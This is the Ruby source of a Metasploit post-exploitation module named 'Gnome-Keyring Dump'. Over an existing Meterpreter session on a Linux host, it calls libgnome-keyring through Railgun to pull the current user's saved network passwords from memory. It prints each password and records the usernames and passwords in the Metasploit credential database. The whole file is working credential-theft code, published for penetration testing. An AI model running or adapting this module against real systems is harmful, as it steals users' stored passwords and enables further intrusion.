##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bindata'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Gnome-Keyring Dump',
      'Description'    => %q{
        Use libgnome-keyring to extract network passwords for the current user.
        This module does not require root privileges to run.
      },
      'Author'        => 'Spencer McIntyre',
      'License'       => MSF_LICENSE,
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  class GList_x64 < BinData::Record
    endian :little
    uint64 :data_ptr
    uint64 :next_ptr
    uint64 :prev_ptr
  end

  class GList_x86 < BinData::Record
    endian :little
    uint32 :data_ptr
    uint32 :next_ptr
    uint32 :prev_ptr
  end

  # https://developer.gnome.org/glib/unstable/glib-Doubly-Linked-Lists.html#GList
  def struct_glist
    session.native_arch == ARCH_X64 ? GList_x64 : GList_x86
  end

  class GnomeKeyringNetworkPasswordData_x64 < BinData::Record
    endian :little
    uint64 :keyring
    uint64 :item_id
    uint64 :protocol
    uint64 :server
    uint64 :object
    uint64 :authtype
    uint64 :port
    uint64 :user
    uint64 :domain
    uint64 :password
  end

  class GnomeKeyringNetworkPasswordData_x86 < BinData::Record
    endian :little
    uint32 :keyring
    uint32 :item_id
    uint32 :protocol
    uint32 :server
    uint32 :object
    uint32 :authtype
    uint32 :port
    uint32 :user
    uint32 :domain
    uint32 :password
  end

  # https://developer.gnome.org/gnome-keyring/stable/gnome-keyring-Network-Passwords.html#GnomeKeyringNetworkPasswordData
  def struct_gnomekeyringnetworkpassworddata
    session.native_arch == ARCH_X64 ? GnomeKeyringNetworkPasswordData_x64 : GnomeKeyringNetworkPasswordData_x86
  end

  def init_railgun_defs
    unless session.railgun.libraries.has_key?('libgnome_keyring')
      session.railgun.add_library('libgnome_keyring', 'libgnome-keyring.so.0')
    end
    session.railgun.add_function(
      'libgnome_keyring',
      'gnome_keyring_is_available',
      'BOOL',
      [],
      nil,
      'cdecl'
    )
    session.railgun.add_function(
      'libgnome_keyring',
      'gnome_keyring_find_network_password_sync',
      'DWORD',
      [
        ['PCHAR', 'user', 'in'],
        ['PCHAR', 'domain', 'in'],
        ['PCHAR', 'server', 'in'],
        ['PCHAR', 'object', 'in'],
        ['PCHAR', 'protocol', 'in'],
        ['PCHAR', 'authtype', 'in'],
        ['DWORD', 'port', 'in'],
        ['PBLOB', 'results', 'out']
      ],
      nil,
      'cdecl'
    )
    session.railgun.add_function(
      'libgnome_keyring',
      'gnome_keyring_network_password_list_free',
      'VOID',
      [['LPVOID', 'list', 'in']],
      nil,
      'cdecl'
    )
  end

  def get_string(address, chunk_size=64, max_size=256)
    data = ''
    begin
      data << session.railgun.memread(address + data.length, chunk_size)
    end until data.include?("\x00") or data.length >= max_size

    if data.include?("\x00")
      idx = data.index("\x00")
      data = data[0...idx]
    end

    data[0...max_size]
  end

  def get_struct(address, record)
    record = record.new
    record.read(session.railgun.memread(address, record.num_bytes))
    Hash[record.field_names.map { |field| [field, record[field]] }]
  end

  def get_list_entry(address)
    glist_struct = get_struct(address, struct_glist)
    glist_struct[:data] = get_struct(glist_struct[:data_ptr], struct_gnomekeyringnetworkpassworddata)
    glist_struct
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: opts[:protocol],
      workspace_id: myworkspace_id
    }

    credential_data = {
      post_reference_name: self.refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:username]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def resolve_host(name)
    address = @hostname_cache[name]
    return address unless address.nil?
    vprint_status("Resolving hostname: #{name}")
    begin
      address = session.net.resolve.resolve_host(name)[:ip]
    rescue Rex::Post::Meterpreter::RequestError
    end
    @hostname_cache[name] = address
  end

  def resolve_port(service)
    port = {
      'ftp'   => 21,
      'http'  => 80,
      'https' => 443,
      'sftp'  => 22,
      'ssh'   => 22,
      'smb'   => 445
    }[service]
    port.nil? ? 0 : port
  end

  def run
    init_railgun_defs
    @hostname_cache = {}
    libgnome_keyring = session.railgun.libgnome_keyring

    unless libgnome_keyring.gnome_keyring_is_available()['return']
      fail_with(Failure::NoTarget, 'libgnome-keyring is unavailable')
    end

    result = libgnome_keyring.gnome_keyring_find_network_password_sync(
      nil,  # user
      nil,  # domain
      nil,  # server
      nil,  # object
      nil,  # protocol
      nil,  # authtype
      0,    # port
      session.native_arch == ARCH_X64 ? 8 : 4
    )

    list_anchor = result['results'].unpack(session.native_arch == ARCH_X64 ? 'Q' : 'L')[0]
    fail_with(Failure::NoTarget, 'Did not receive a list of passwords') if list_anchor == 0

    entry = {:next_ptr => list_anchor}
    begin
      entry = get_list_entry(entry[:next_ptr])
      pw_data = entry[:data]
      # resolve necessary string fields to non-empty strings or nil
      [:server, :user, :domain, :password, :protocol].each do |field|
        value = pw_data[field]
        pw_data[field] = nil
        next if value == 0
        value = get_string(value)
        next if value.empty?
        pw_data[field] = value
      end

      # skip the entry if we don't at least have a username and password
      next if pw_data[:user].nil? or pw_data[:password].nil?

      printable = ''
      printable << "#{pw_data[:protocol]}://" unless pw_data[:protocol].nil?
      printable << "#{pw_data[:domain]}\\" unless pw_data[:domain].nil?
      printable << "#{pw_data[:user]}:#{pw_data[:password]}"
      unless pw_data[:server].nil?
        printable << "@#{pw_data[:server]}"
        printable << ":#{pw_data[:port]}"
      end
      print_good(printable)

      pw_data[:port] = resolve_port(pw_data[:protocol]) if pw_data[:port] == 0 and !pw_data[:protocol].nil?
      next if pw_data[:port] == 0  # can't report without a valid port
      ip_address = resolve_host(pw_data[:server])
      next if ip_address.nil?      # can't report without an ip address

      report_cred(
        ip: ip_address,
        port: pw_data[:port],
        protocol: 'tcp',
        service_name: pw_data[:protocol],
        username: pw_data[:user],
        password: pw_data[:password]
      )

    end while entry[:next_ptr] != list_anchor and entry[:next_ptr] != 0

    libgnome_keyring.gnome_keyring_network_password_list_free(list_anchor)
  end
end
